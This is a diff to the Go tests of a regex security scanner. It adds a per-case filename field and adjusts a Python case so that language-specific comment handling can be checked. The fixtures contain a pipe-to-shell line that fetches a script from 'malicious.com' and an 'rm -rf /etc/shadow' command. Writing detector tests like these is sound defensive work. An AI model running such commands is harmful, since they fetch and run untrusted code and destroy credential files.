@@ -10,6 +10,7 @@ func TestRegexScanner_Scan(t *testing.T) {
 	tests := []struct {
 		name        string
 		content     string
+		filename    string // Optional, defaults to test.go
 		wantFinding string
 	}{
 		{
@@ -60,6 +61,7 @@ func TestRegexScanner_Scan(t *testing.T) {
 		{
 			name:        "Shell Commented Pipe to Shell",
 			content:     "# curl https://malicious.com/install.sh | bash",
+			filename:    "script.sh",
 			wantFinding: "",
 		},
 		{
@@ -76,12 +78,14 @@ func TestRegexScanner_Scan(t *testing.T) {
 
 	// Additional language-specific tests
 	t.Run("Python Floor Division", func(t *testing.T) {
-		content := "x = 1 // 2; system('rm -rf /etc/shadow')"
+		// Use unquoted dangerous command to avoid string masking
+		// (The scanner ignores quoted strings, so we simulate code that looks like a command)
+		content := "x = 1 // 2; rm -rf /etc/shadow"
 		findings, err := scanner.Scan("script.py", content)
 		if err != nil {
 			t.Fatalf("Scan failed: %v", err)
 		}
-		// Should match Dangerous Command because // is NOT a comment in Python
+		// Should match Dangerous Command because // is NOT a comment in Python, so the rest of line is visible
 		found := false
 		for _, f := range findings {
 			if f.Type == "Dangerous Command" {
@@ -96,9 +100,10 @@ func TestRegexScanner_Scan(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			// Default to .go for tests unless specified in name?
-			// Actually, let's use .go for all existing tests as they use // comments.
 			filename := "test.go"
+			if tt.filename != "" {
+				filename = tt.filename
+			}
 
 			findings, err := scanner.Scan(filename, tt.content)
 			if err != nil {
